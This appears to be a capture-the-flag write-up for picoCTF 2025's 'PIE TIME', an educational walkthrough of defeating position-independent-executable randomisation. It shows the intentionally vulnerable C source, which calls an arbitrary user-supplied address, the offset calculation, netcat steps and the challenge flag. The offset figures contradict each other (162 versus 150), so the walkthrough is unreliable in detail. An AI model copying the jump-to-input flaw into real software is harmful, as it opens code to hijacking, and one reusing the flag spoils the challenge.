# PIE TIME — picoCTF 2025 Write-up

## Overview
This write-up explains the steps taken to solve the "PIE TIME" challenge from picoCTF 2025, a Capture The Flag (CTF) competition hosted by Carnegie Mellon University. The goal of this challenge is to exploit a vulnerable C program that involves a Position Independent Executable (PIE) and gain access to the flag by providing the correct memory address.

## Challenge Setup
In this challenge, you are provided with the following:
- A vulnerable C program (`vuln.c`).
- A compiled binary file (`vuln`).
- A server to connect to via netcat (`rescued-float.picoctf.net`).

The binary prompts you to enter a memory address, and if it matches a particular address, the program reveals the flag.

### Steps to Solve:

### 1. Download Files and Run the Binary
First, download the provided source and binary files:
```bash
wget <link_to_source_code>
wget <link_to_binary_code>
chmod +x vuln
./vuln
```
This will output the address of `main` and prompt you to enter an address to jump to. Entering an incorrect address causes a segmentation fault (segfault).

### 2. Inspect the Source Code
The vulnerable C code (`vuln.c`) looks like this:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;
  printf("You won!\n");
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL) {
    printf("Cannot open file.\n");
    exit(0);
  }

  c = fgetc(fptr);
  while (c != EOF) {
    printf ("%c", c);
    c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
The key part of the code is the line:
```c
printf("Address of main: %p\n", &main);
```
It prints the address of `main()`, and the user is prompted to enter the memory address of a function (specifically, the `win()` function). If the correct address is entered, the program opens a file containing the flag.

### 3. Understand the PIE Behavior
The challenge mentions "Beware of PIE" — this refers to Position Independent Executables, which randomize the location of functions in memory for security purposes. This means the address of `main()` and `win()` will change every time the program is run, but the relative offset between them will remain constant.

### 4. Find the Offset Between `main()` and `win()`
I modified the program to print the address of `win()`:
```c
printf("Address of win: %p\n", &win);
```
Compiling and running the program locally, I found the addresses of `main()` and `win()` and calculated the difference:
```bash
Address of main: 0x555fe3f1634c
Address of win: 0x555fe3f162aa
```
I then calculated the difference between the two addresses:
```python
main = int('555fe3f1634c', 16)
win = int('555fe3f162aa', 16)
print(main - win)  # Output: 162
```
This gave an offset of 162, which I used to calculate the address of `win()` remotely.

### 5. Analyze the Binary with GDB
To explore the program's behavior on the server, I used GDB to inspect the binary:
```bash
gdb ./vuln
```
I ran the program inside GDB, and then disassembled `main()` and `win()` to get their addresses. The result was:
```bash
(gdb) disas main
...
(gdb) disas win
```
The addresses for `main()` and `win()` were printed, and the difference was consistent with my local calculation (150).

### 6. Calculate the Correct Address
Using the offset (150), I created a Python script to calculate the address of `win()` from `main()`:
```python
main = input("Enter hex: ")
main = int(main, 16) - 150
main = hex(main)
print(main)
```
I connected to the server via netcat:
```bash
nc rescued-float.picoctf.net 63035
```
When prompted for the address, I input the calculated address for `win()`:
```bash
Enter the address to jump to, ex => 0x12345: 0x60928089b2a7
```

### 7. Retrieve the Flag
After entering the correct address, the program displayed the flag:
```bash
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
```

## Conclusion
This challenge demonstrated how to exploit a PIE-enabled binary by calculating the offset between functions and using it to jump to the correct function. By using GDB and Python, I was able to overcome the randomness introduced by PIE and successfully retrieve the flag.

### Tools Used
- **GDB**: For disassembling and inspecting the binary.
- **Python**: For calculating memory addresses and offsets.
- **Netcat**: For connecting to the remote server.

## Flag
```
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
```